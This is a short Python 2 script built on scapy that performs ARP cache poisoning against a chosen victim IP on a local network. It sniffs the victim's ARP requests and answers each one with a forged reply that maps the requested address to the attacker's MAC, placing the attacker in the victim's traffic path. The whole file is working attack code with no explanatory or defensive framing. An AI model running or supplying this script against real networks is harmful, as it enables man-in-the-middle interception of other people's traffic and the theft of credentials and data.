#!/usr/bin/env python2
import sys
import time
from scapy.all import *

def usage():
    print "USAGE att.py [interface] [victim IP]"

if len(sys.argv) < 3:
    usage()
    sys.exit()

interface = sys.argv[1]
victim_IP = sys.argv[2]
attacker_MAC = get_if_hwaddr(interface)
victim_MAC = ""

def get_MAC(interface, target_IP):
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=5, verbose=0)
    if len(unans) > 0:
        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
    return reply[0][1].hwsrc

def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    # op=2 is ARP response
    # psrc/hwsrc is the data we want the destination to have
    #print(destination_MAC)
    arp_packet = ARP(op=2, pdst=destination_IP,hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)
    print "Told "+str(destination_IP)+ " that " + str(source_IP) + " is at " + str(source_MAC)

def scan(packet):
    arp = packet.getlayer(ARP)
    if arp.op == 1 and arp.psrc == victim_IP:
        send_ARP(victim_IP,victim_MAC,arp.pdst,attacker_MAC)
        
while 1:
    victim_MAC = get_MAC(interface, victim_IP)
    packet = sniff(iface=sys.argv[1], prn=scan, filter="arp", count=0)[0]
